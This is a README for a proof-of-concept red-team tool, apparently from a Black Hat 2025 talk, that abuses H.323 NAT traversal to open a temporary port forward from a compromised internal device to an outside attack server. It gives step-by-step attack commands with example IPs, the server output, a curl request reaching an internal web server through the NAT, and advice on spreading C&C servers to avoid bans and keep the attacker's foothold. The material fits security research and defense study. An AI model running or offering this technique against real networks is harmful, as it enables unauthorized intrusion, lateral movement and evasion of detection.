# Simple H.323 NAT Traversal

A tool that opens a temporary DNAT using H.323 NAT Traversal to create a breakpoint for red teaming under NAT environments!

## Reference

- This is a PoC code for Black Hat USA 2025 Briefing: [From Spoofing to Tunneling: New Red Team's Networking Techniques for Initial Access and Evasion](https://www.blackhat.com/us-25/briefings/schedule/#from-spoofing-to-tunneling-new-red-teams-networking-techniques-for-initial-access-and-evasion-44678) 
- This idea is derived from [NAT slipstreaming](https://samy.pl/slipstream) by [@samykamkar](https://twitter.com/samykamkar)

## Usage

1. **Start the attack server** (example IP: `9.9.9.9`):

    ```bash
    python3 server.py 
    Listening on 0.0.0.0:1720 ...
    ```

2. **Send an H.323 NAT Traversal packet**  
   - NAT public IP: `2.2.2.2`
   - Compromised device internal IP: `192.168.1.2`
   - Internal web server IP: `192.168.1.3`

    ```bash
    python3 main.py -d <next_target_ip> -p <next_target_port> -s <attack_public_ip>
    python3 main.py -d 192.168.1.3 -p 8080 -s 9.9.9.9
    ```

3. **Server output:**

    ```
    Listening on 0.0.0.0:1720 ...
    Connected by: 2.2.2.2:41658
    Received Remote IP (from payload): 2.2.2.2
    Received Remote Port (from payload): 8080
    ```

4. **Now you can directly access** `http://192.168.1.3:8080/` **via** `curl http://2.2.2.2:8080/`

5. **Logs from 192.168.1.3:**

    ```
    python3 -m http.server 8080
    Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
    9.9.9.9 - - [07/Jun/2025 10:10:08] "GET / HTTP/1.1" 200 -
    ```
    > You will see that the logs show requests coming from 9.9.9.9, making it difficult to associate them with 192.168.1.2.
    > The only way to relate them is that both 192.168.1.2 and 192.168.1.3 have communicated with 9.9.9.9.

## Best Practices
- Use different IP C&C servers for `192.168.1.2` and `192.168.1.3` to prevent 9.9.9.9 from being banned and losing the C&C connection.

## Demo video
- [YouTube](https://youtu.be/0mvEMlD_oa8)

## Disclaimer
This project is intended for educational and research purposes only. Any actions and/or activities related to this code are solely your responsibility. The authors and contributors are not responsible for any misuse or damage caused by this project. Please ensure that you have proper authorization before testing, using, or deploying any part of this code in any environment. Unauthorized use of this code may violate local, state, and federal laws.

## License
This project is licensed under the terms of the MIT license.
